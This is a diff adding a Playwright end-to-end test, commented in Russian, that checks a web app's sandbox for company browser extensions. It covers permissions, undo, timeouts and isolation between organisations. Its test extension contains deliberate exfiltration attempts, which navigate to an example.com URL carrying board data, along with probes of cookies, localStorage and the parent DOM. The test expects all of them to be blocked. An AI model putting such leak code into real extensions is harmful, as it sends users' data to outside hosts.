@@ -1,0 +1,282 @@
+// Расширения компании в браузере: владелец публикует, сотрудник включает с подтверждением разрешений,
+// команды работают в песочнице (без сети, страницы приложения, хранилища и куки), уход со страницы останавливает расширение,
+// новые разрешения в новой версии снова спрашиваются.
+// Нужен настоящий сервер на чистой базе с открытой регистрацией: REGISTRATION=open node tests/orgext-e2e.mjs
+import { chromium } from 'playwright';
+
+const B = process.env.TRIOSTEUM_URL || 'http://127.0.0.1:8000';
+const T = Date.now().toString(36);
+const SHOTS = process.env.SHOTS || '';
+const b = await chromium.launch();
+let fail = 0; const errs = [];
+const ok = (c, n) => { console.log((c ? '  ✓ ' : '  ✗ ') + n); if (!c) fail++; };
+const page = async () => { const p = await (await b.newContext({ viewport: { width: 1440, height: 900 } })).newPage(); p.on('pageerror', (e) => errs.push(e.message)); return p; };
+const api = (p, method, path, body) => p.evaluate(async ([m, u, bd]) => { const r = await fetch('/api' + u, { method: m, headers: { 'Content-Type': 'application/json' }, body: bd ? JSON.stringify(bd) : undefined }); return { status: r.status, data: await r.json().catch(() => null) }; }, [method, path, body]);
+async function register(p, org, name, email) {
+  await p.goto(B + '/login'); await p.click('#tReg');
+  await p.fill('#org', org); await p.fill('#name', name); await p.fill('#email', email); await p.fill('#pw', 'password123'); await p.check('#pd');
+  await p.click('#go'); await p.waitForURL(B + '/'); await p.waitForTimeout(900);
+}
+async function palette(p, q, keep) {
+  if (keep) await p.evaluate(() => document.activeElement && document.activeElement.blur()); else await p.keyboard.press('Escape');
+  await p.keyboard.press('Control+k'); await p.waitForTimeout(200);
+  await p.fill('#cmdQ', q); await p.waitForTimeout(250);
+  return p.locator('#cmdList .cmdk-i', { hasText: q });
+}
+async function has(p, q) { const n = await (await palette(p, q)).count(); await p.keyboard.press('Escape'); return n; }
+async function cmd(p, q, keep) {
+  const it = await palette(p, q, keep);
+  if (!(await it.count())) { await p.keyboard.press('Escape'); return 0; }
+  await p.evaluate(() => { document.getElementById('toast').textContent = ''; });   // ждём новое уведомление, а не прошлое
+  await it.first().click(); await p.waitForTimeout(200);
+  return 1;
+}
+async function toastAfter(p, ms = 2500) {
+  const end = Date.now() + ms; let t = '';
+  while (Date.now() < end) { t = (await p.textContent('#toast').catch(() => '')) || ''; if (t && !/выполняется/.test(t)) break; await p.waitForTimeout(100); }
+  return t;
+}
+
+const CODE = `
+triosteum.command('count', async () => {
+  const b = await triosteum.board.get();
+  const n = await triosteum.board.add({ name: 'Из расширения', code: 'print(1)' });
+  const n2 = await triosteum.board.add({ name: 'Второй', x: n.x + 300, y: n.y });
+  await triosteum.board.connect(n.id, n2.id);
+  await triosteum.board.note({ text: 'Заметка расширения', attach: n.id });
+  await triosteum.ui.toast('было ' + b.nodes.length + ', стало ' + (b.nodes.length + 2));
+});
+triosteum.command('probe', async () => {
+  const r = [];
+  try { await fetch('/api/spaces'); r.push('fetch:ok'); } catch (e) { r.push('fetch:no'); }
+  try { await fetch('https://example.com/'); r.push('net:ok'); } catch (e) { r.push('net:no'); }
+  try { parent.document.title; r.push('dom:ok'); } catch (e) { r.push('dom:no'); }
+  try { localStorage.length; r.push('ls:ok'); } catch (e) { r.push('ls:no'); }
+  try { document.cookie; r.push('cookie:ok'); } catch (e) { r.push('cookie:no'); }
+  try { await triosteum.storage.get('a'); r.push('storage:ok'); } catch (e) { r.push('storage:no'); }
+  await triosteum.ui.toast(r.join(' '));
+});
+triosteum.command('panel', async () => { document.body.innerHTML = '<h3 id="hi">Привет из панели</h3>'; await triosteum.ui.openPanel(); });
+triosteum.command('boom', () => { throw new Error('сломалось нарочно'); });
+triosteum.command('nav', () => { location.href = 'about:blank'; });
+triosteum.command('leak', async () => {
+  const b = await triosteum.board.get();
+  location.href = 'https://example.com/leak?data=' + encodeURIComponent(JSON.stringify(b.nodes.map((n) => n.name)));
+});
+triosteum.command('leak2', () => { const a = document.createElement('a'); a.href = 'https://example.com/leak2?x=1'; document.body.appendChild(a); a.click(); });
+triosteum.command('mk', async () => { await triosteum.board.add({ name: 'Для редактора', lang: 'python', code: 'print(1)' }); });
+triosteum.command('recode', async () => {
+  const b = await triosteum.board.get();
+  const n = b.nodes.find((x) => x.name === 'Для редактора');
+  await triosteum.board.update(n.id, { code: 'print("из расширения")' });
+});
+triosteum.command('switchy', async () => {
+  const n = await triosteum.board.add({ name: 'До переключения' });
+  await new Promise((r) => setTimeout(r, 1500));
+  await triosteum.board.update(n.id, { name: 'Испорчено' });
+});
+triosteum.command('hang', async () => {
+  await new Promise((r) => setTimeout(r, 1500));
+  await triosteum.board.add({ name: 'Опоздавший' });
+});
+triosteum.command('many', async () => { for (let i = 0; i < 160; i++) await triosteum.board.add({ name: 'Много ' + i, x: (i % 16) * 260, y: 2000 + Math.floor(i / 16) * 140 }); });
+triosteum.command('pause', async () => {
+  await triosteum.board.add({ name: 'Медленный 1' });
+  await new Promise((r) => setTimeout(r, 2500));
+  await triosteum.board.add({ name: 'Медленный 2' });
+});
+triosteum.command('slow', async () => {
+  await triosteum.board.add({ name: 'Медленный 1' });
+  await new Promise((r) => setTimeout(r, 700));
+  await triosteum.board.add({ name: 'Медленный 2' });
+});
+`;
+// только запись, без чтения: изменить блок можно, а узнать его содержимое — нет
+const WRITER = { id: 'xpisatel', name: 'Писатель', perms: ['board.write'], commands: [{ id: 'peek', label: 'Подсмотреть' }],
+  code: `triosteum.command('peek', async () => {
+  const n = await triosteum.board.add({ name: 'Свой блок', code: 'x = 1' });
+  const u = await triosteum.board.update(n.id, {});
+  let guess = 'пусто';
+  try { await triosteum.board.update(n.id.replace(/\\d+/, (d) => String(d - 1)), { name: 'взлом' }); guess = 'получилось'; } catch (e) { guess = e.message; }
+  await triosteum.ui.toast('ключи: ' + Object.keys(u).join(',') + ' | ' + guess);
+});` };
+const EXT = {
+  id: 'xproverka', name: 'Проверка схемы', desc: 'Тестовое расширение', perms: ['board.read', 'board.write', 'panel'], panel: 'Проверка',
+  commands: [{ id: 'count', label: 'Посчитать и добавить' }, { id: 'probe', label: 'Проверить песочницу' }, { id: 'panel', label: 'Показать панель' },
+    { id: 'boom', label: 'Упасть' }, { id: 'nav', label: 'Уйти со страницы' }, { id: 'leak', label: 'Вынести доску' }, { id: 'leak2', label: 'Вынести ссылкой' }, { id: 'slow', label: 'Медленно' },
+    { id: 'mk', label: 'Блок для редактора' }, { id: 'recode', label: 'Переписать код' }, { id: 'switchy', label: 'Долгая правка' }, { id: 'hang', label: 'Зависнуть' }, { id: 'pause', label: 'С паузой' }, { id: 'many', label: 'Много блоков' }],
+  code: CODE,
+};
+
+console.log('Владелец публикует расширение, редактор — не может');
+const a = await page();
+await register(a, 'Завод Расширения ' + T, 'Аня', `anya${T}@zavod.ru`);
+const inv = await api(a, 'POST', '/org/invites', { email: `kolya${T}@zavod.ru`, role: 'editor' });
+const pub = await api(a, 'POST', '/org/items', { kind: 'ext', src: EXT.id, data: EXT });
+ok(pub.status === 201 && pub.data.data.ver === 1, 'владелец опубликовал расширение');
+const k = await page();
+await k.goto(B + inv.data.path); await k.waitForTimeout(500);
+await k.fill('#pw', 'password123'); if (await k.locator('#name').isVisible()) await k.fill('#name', 'Коля'); await k.check('#pd');
+await k.click('#go'); await k.waitForURL(B + '/'); await k.waitForTimeout(900);
+ok((await api(k, 'POST', '/org/items', { kind: 'ext', src: 'xchuzhoe', data: { ...EXT, id: 'xchuzhoe' } })).status === 403, 'редактор опубликовать расширение не может');
+
+console.log('Сотрудник включает расширение');
+ok(await has(k, 'Проверка схемы: Посчитать') === 0, 'до включения команд расширения нет');
+await cmd(k, 'Расширения компании'); await k.waitForTimeout(600);
+const cardK = k.locator('.ext-card[data-ext="xproverka"]');
+ok(await cardK.count() === 1, 'расширение видно в окне «Расширения компании»');
+ok(/выключено/.test(await cardK.locator('.ext-state').textContent()), 'по умолчанию выключено');
+ok(await cardK.locator('button:has-text("Убрать из компании")').count() === 0, 'редактор не может убрать расширение');
+await cardK.locator('button:has-text("Включить…")').click(); await k.waitForTimeout(200);
+const conf = await cardK.locator('.ext-confirm').textContent();
+ok(/читать блоки/.test(conf) && /добавлять и менять/.test(conf) && /боковую панель/.test(conf) && /интернет/.test(conf), 'перед включением показаны разрешения и что недоступно');
+if (SHOTS) await k.screenshot({ path: `${SHOTS}/ext-confirm.png` });
+await cardK.locator('button:has-text("Разрешить и включить")').click(); await k.waitForTimeout(300);
+ok(/включено/.test(await cardK.locator('.ext-state').textContent()), 'расширение включено');
+await k.keyboard.press('Escape');
+
+console.log('Команды в песочнице');
+const before = await k.locator('#nodes .node').count();
+await cmd(k, 'Проверка схемы: Посчитать');
+const t1 = await toastAfter(k);
+ok(/было \d+, стало \d+/.test(t1), 'команда прочитала доску и ответила: ' + t1);
+await k.waitForTimeout(500);
+ok(await k.locator('#nodes .node').count() === before + 2, 'расширение добавило два блока');
+ok(await k.locator('#nodes .node:has-text("Из расширения")').count() === 1, 'с нужным названием');
+await k.keyboard.press('Control+z'); await k.waitForTimeout(500);
+ok(await k.locator('#nodes .node').count() === before, 'Ctrl+Z отменяет всё, что сделала команда');
+await cmd(k, 'Проверка схемы: Медленно'); await k.waitForTimeout(300);
+await k.keyboard.press('Control+z'); await k.waitForTimeout(100);
+ok(/ещё выполняет команду/.test(await k.textContent('#toast')), 'во время команды Ctrl+Z ждёт её завершения');
+await k.waitForTimeout(1300);
+ok(await k.locator('#nodes .node').count() === before + 2, 'медленная команда добавила два блока с паузой');
+await k.keyboard.press('Control+z'); await k.waitForTimeout(500);
+ok(await k.locator('#nodes .node').count() === before, 'один Ctrl+Z отменяет всю медленную команду');
+// пользователь правит доску, пока команда ждёт: его правка — отдельная запись отмены и не пропадает с командой
+await cmd(k, 'Проверка схемы: С паузой'); await k.waitForTimeout(250);
+await cmd(k, 'Новый блок'); await k.waitForTimeout(3000);
+await k.keyboard.press('Escape'); await k.evaluate(() => document.activeElement && document.activeElement.blur());
+ok(await k.locator('#nodes .node').count() === before + 3, 'команда добавила два блока, пользователь — один');
+const named = async (t) => k.locator('#nodes .node', { hasText: t }).count();
+await k.keyboard.press('Control+z'); await k.waitForTimeout(400);
+ok(await k.locator('#nodes .node').count() === before + 2 && await named('Медленный 2') === 0, 'первый Ctrl+Z — последнее действие команды');
+await k.keyboard.press('Control+z'); await k.waitForTimeout(400);
+ok(await k.locator('#nodes .node').count() === before + 1 && await named('Медленный 1') === 1, 'второй — блок пользователя; начало команды на месте');
+await k.keyboard.press('Control+z'); await k.waitForTimeout(400);
+ok(await k.locator('#nodes .node').count() === before, 'третий — начало команды');
+await k.keyboard.press('Control+y'); await k.waitForTimeout(300); await k.keyboard.press('Control+y'); await k.waitForTimeout(300);
+ok(await k.locator('#nodes .node').count() === before + 2 && await named('Медленный 1') === 1, 'повтор возвращает по одному действию');
+await k.keyboard.press('Control+y'); await k.waitForTimeout(300);
+ok(await k.locator('#nodes .node').count() === before + 3, 'и последнее действие команды');
+for (let i = 0; i < 3; i++) { await k.keyboard.press('Control+z'); await k.waitForTimeout(300); }
+// две команды подряд: вторая ждёт первую, у каждой своя запись отмены
+await cmd(k, 'Проверка схемы: С паузой'); await k.waitForTimeout(200);
+await cmd(k, 'Проверка схемы: Блок для редактора'); await k.waitForTimeout(3300);
+await k.evaluate(() => document.activeElement && document.activeElement.blur());
+ok(await named('Медленный 2') === 1 && await named('Для редактора') === 1, 'обе команды выполнились');
+const order = await k.locator('#nodes .node').evaluateAll((els) => els.map((e) => e.textContent).filter((t) => /Медленный 2|Для редактора/.test(t)).map((t) => /Медленный/.test(t) ? 'A' : 'B').join(''));
+ok(order === 'AB', 'вторая команда начала после первой: ' + order);
+await k.keyboard.press('Control+z'); await k.waitForTimeout(400);
+ok(await named('Для редактора') === 0 && await named('Медленный 2') === 1 && await named('Медленный 1') === 1, 'Ctrl+Z отменяет только вторую команду');
+await k.keyboard.press('Control+z'); await k.waitForTimeout(400);
+ok(await named('Медленный 1') === 0 && await named('Медленный 2') === 0 && await k.locator('#nodes .node').count() === before, 'следующий Ctrl+Z — первую целиком');
+// больше 150 изменений одной командой — всё равно одна запись отмены, начало команды не вытесняется
+await cmd(k, 'Проверка схемы: Много блоков'); await k.waitForTimeout(4000);
+ok(await k.locator('#nodes .node').count() === before + 160, 'команда добавила 160 блоков');
+await k.evaluate(() => document.activeElement && document.activeElement.blur());
+await k.keyboard.press('Control+z'); await k.waitForTimeout(600);
+ok(await k.locator('#nodes .node').count() === before, 'один Ctrl+Z отменяет все 160 — начало команды сохранилось');
+await cmd(k, 'Проверка схемы: Проверить песочницу');
+const t2 = await toastAfter(k);
+ok(/fetch:no/.test(t2) && /net:no/.test(t2), 'запросы к серверу и в интернет закрыты: ' + t2);
+ok(/dom:no/.test(t2) && /ls:no/.test(t2) && /cookie:no/.test(t2), 'страница приложения, его хранилище и куки недоступны');
+ok(/storage:no/.test(t2), 'без разрешения «storage» хранилище расширения не работает');
+await cmd(k, 'Проверка схемы: Упасть');
+ok(/сломалось нарочно/.test(await toastAfter(k)), 'ошибка команды показана пользователю');
+await cmd(k, 'Панель «Проверка»'); await k.waitForTimeout(800);
+const pane = k.locator('.ext-pane.open');
+ok(await pane.count() === 1, 'панель расширения открылась');
+await cmd(k, 'Проверка схемы: Показать панель'); await k.waitForTimeout(500);
+ok(await k.frameLocator('.ext-pane.open iframe').frameLocator('iframe').locator('#hi').textContent() === 'Привет из панели', 'расширение рисует в своей панели');
+ok(await k.locator('.ext-frame').first().getAttribute('sandbox') === 'allow-scripts', 'панель — iframe-песочница без allow-same-origin');
+if (SHOTS) await k.screenshot({ path: `${SHOTS}/ext-panel.png` });
+const leaks = [];
+k.on('request', (rq) => { if (/example\.com/.test(rq.url())) leaks.push(rq.url()); });
+await cmd(k, 'Проверка схемы: Вынести доску'); await k.waitForTimeout(1500);
+await cmd(k, 'Проверка схемы: Вынести ссылкой'); await k.waitForTimeout(1500);
+ok(leaks.length === 0, 'переход расширения на внешний адрес заблокирован до запроса' + (leaks.length ? ': ' + leaks[0] : ''));
+await cmd(k, 'Проверка схемы: Уйти');
+ok(/перейти на другую страницу/.test(await toastAfter(k, 4000)), 'уход со страницы замечен');
+await k.waitForTimeout(300);
+ok(await k.locator('.ext-pane').count() === 0, 'расширение остановлено');
+await cmd(k, 'Проверка схемы: Посчитать');
+ok(/было \d+/.test(await toastAfter(k, 4000)), 'при следующем вызове расширение запускается заново');
+
+console.log('Открытый редактор и смена пространства');
+await cmd(k, 'Проверка схемы: Блок для редактора'); await k.waitForTimeout(800);
+await k.click('#nodes .node:has-text("Для редактора")'); await k.waitForTimeout(300);
+await k.keyboard.press('Enter'); await k.waitForTimeout(500);
+ok((await k.inputValue('#code')).trim() === 'print(1)', 'блок открыт в редакторе');
+await cmd(k, 'Проверка схемы: Переписать код', true); await k.waitForTimeout(1000);
+ok((await k.inputValue('#code')).trim() === 'print("из расширения")', 'редактор показывает код, который записало расширение');
+await k.locator('#code').press('End'); await k.keyboard.type('  # ок'); await k.waitForTimeout(500);
+ok(/из расширения.*# ок/.test(await k.inputValue('#code')), 'правка в редакторе не возвращает старый код');
+await k.keyboard.press('Escape');
+await k.evaluate(() => { const b = document.querySelector('#editor .back, #backBtn'); if (b) b.click(); }); await k.waitForTimeout(400);
+await cmd(k, 'Проверка схемы: Долгая правка'); await k.waitForTimeout(300);
+await cmd(k, 'Создать пространство'); await k.waitForTimeout(400);
+let tsw = '';
+for (let i = 0; i < 30; i++) { const t = await k.textContent('#toast'); if (!tsw.endsWith(t)) tsw += ' || ' + t; await k.waitForTimeout(100); }
+ok(/пространство сменилось/.test(tsw + await k.textContent('#toast')), 'смена пространства во время команды останавливает расширение');
+ok(await k.locator('#nodes .node:has-text("Испорчено")').count() === 0, 'в новом пространстве ничего не испорчено');
+
+await k.evaluate(() => { window.__tsExtCmdTimeout = 600; });
+await cmd(k, 'Проверка схемы: Зависнуть');
+ok(/не ответила за минуту — расширение остановлено/.test(await toastAfter(k, 3000)), 'зависшая команда останавливает расширение');
+await k.waitForTimeout(1800);
+ok(await k.locator('#nodes .node:has-text("Опоздавший")').count() === 0, 'после остановки зависшая команда доску не меняет');
+await k.evaluate(() => { delete window.__tsExtCmdTimeout; });
+
+console.log('Только запись — без чтения');
+await api(a, 'POST', '/org/items', { kind: 'ext', src: WRITER.id, data: WRITER });
+await cmd(k, 'Расширения компании'); await k.waitForTimeout(800);
+await k.locator('.ext-card[data-ext="xpisatel"] button:has-text("Включить…")').click();
+await k.locator('.ext-card[data-ext="xpisatel"] button:has-text("Разрешить и включить")').click(); await k.waitForTimeout(200);
+await k.keyboard.press('Escape');
+await cmd(k, 'Писатель: Подсмотреть');
+const tw = await toastAfter(k);
+ok(/ключи: id \|/.test(tw), 'без «читать доску» правка блока возвращает только id');
+ok(/не известен/.test(tw), 'чужой блок по угаданному id изменить нельзя: ' + tw);
+
+console.log('Новая версия с новыми разрешениями');
+const v2 = await api(a, 'POST', '/org/items', { kind: 'ext', src: EXT.id, data: { ...EXT, perms: [...EXT.perms, 'storage'] } });
+ok(v2.status === 201 && v2.data.data.ver === 2, 'владелец выпустил версию 2 с хранилищем');
+await cmd(k, 'Расширения компании'); await k.waitForTimeout(800);
+ok(/просит новые разрешения/.test(await cardK.locator('.ext-state').textContent()), 'расширение просит подтвердить новые разрешения');
+await k.keyboard.press('Escape');
+ok(await has(k, 'Проверка схемы: Проверить') === 0, 'пока не подтверждено — команд нет');
+await cmd(k, 'Расширения компании'); await k.waitForTimeout(600);
+await cardK.locator('button:has-text("Посмотреть разрешения")').click();
+ok(/хранить свои настройки/.test(await cardK.locator('.ext-confirm').textContent()), 'в подтверждении — новое разрешение');
+await cardK.locator('button:has-text("Разрешить и включить")').click(); await k.waitForTimeout(200);
+await k.keyboard.press('Escape');
+await cmd(k, 'Проверка схемы: Проверить песочницу');
+ok(/storage:ok/.test(await toastAfter(k)), 'после подтверждения хранилище работает');
+
+console.log('Владелец убирает расширение');
+await cmd(a, 'Расширения компании'); await a.waitForTimeout(600);
+const cardA = a.locator('.ext-card[data-ext="xproverka"]');
+await cardA.locator('button:has-text("Убрать из компании")').click();
+await cardA.locator('button:has-text("Точно")').click(); await a.waitForTimeout(800);
+await a.locator('.ext-card[data-ext="xpisatel"] button:has-text("Убрать из компании")').click();
+await a.locator('.ext-card[data-ext="xpisatel"] button:has-text("Точно")').click(); await a.waitForTimeout(800);
+ok(await a.locator('.ext-card').count() === 0 && /пока нет/.test(await a.textContent('.ext-list')), 'расширение убрано из компании');
+const other = await page();
+await register(other, 'Чужой завод ' + T, 'Петя', `petya${T}@zavod.ru`);
+await api(a, 'POST', '/org/items', { kind: 'ext', src: EXT.id, data: EXT });
+ok((await api(other, 'GET', '/org/items?kind=ext')).data.items.length === 0, 'чужая организация расширений компании не видит');
+
+ok(errs.length === 0, 'нет ошибок JavaScript' + (errs.length ? ': ' + errs.slice(0, 3).join(' | ') : ''));
+await b.close();
+console.log(fail ? `\nОшибок: ${fail}` : '\nВсе проверки пройдены');
+process.exit(fail ? 1 : 0);
